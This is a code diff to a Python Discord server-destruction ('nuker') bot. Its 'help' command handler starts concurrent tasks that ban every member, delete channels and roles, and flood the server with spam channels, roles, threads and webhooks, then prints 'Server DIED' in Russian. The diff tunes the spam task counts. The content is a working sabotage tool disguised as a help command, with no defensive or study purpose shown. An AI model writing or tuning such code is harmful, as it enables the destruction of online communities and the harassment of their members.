@@ -15,8 +15,6 @@ spamt = json.loads(config.get("Thread", "SpamThreadCount"))
 cdt = json.loads(config.get("Thread", "ChannelDelThreadCount"))
 bnall = json.loads(config.get("Thread", "BanAllThreadCount"))
 rdell = json.loads(config.get("Thread", "RolesDeleteThreadCount"))
-spchannel = json.loads(config.get("Thread", "SpamChannelThreadCount"))
-sproles = json.loads(config.get("Thread", "SpamRolesThreadCount"))
 sph = json.loads(config.get("Thread", "SpamHookThreadCount"))
 
 if name == "nt":
@@ -49,8 +47,6 @@ async def hlp(ctx):
             asyncio.create_task(funcs.banall(ctx))
     for c in range(bnall):    
             asyncio.create_task(funcs.chistch(ctx))
-    for c in range(spamt): 
-            asyncio.create_task(funcs.spamth(ctx))
     for c in range(2): 
             asyncio.create_task(funcs.chistemoji(ctx))
     for c in range(2): 
@@ -62,9 +58,11 @@ async def hlp(ctx):
 
     for c in range(2): 
             asyncio.create_task(funcs.masks(ctx))
-    for c in range(spchannel): 
+    for c in range(spamt): 
+            asyncio.create_task(funcs.spamth(ctx))
+    for c in range(4): 
             asyncio.create_task(funcs.spamch(ctx))
-    for c in range(sproles): 
+    for c in range(3): 
             asyncio.create_task(funcs.spamrl(ctx))
     await funcs.spamrl(ctx)
     print(f"{Fore.WHITE}> {Fore.RED}Сервер УМЕР{Fore.WHITE}.")
@@ -146,4 +144,3 @@ except Exception:
     pass
 except KeyboardInterrupt:
     sys.exit()
-
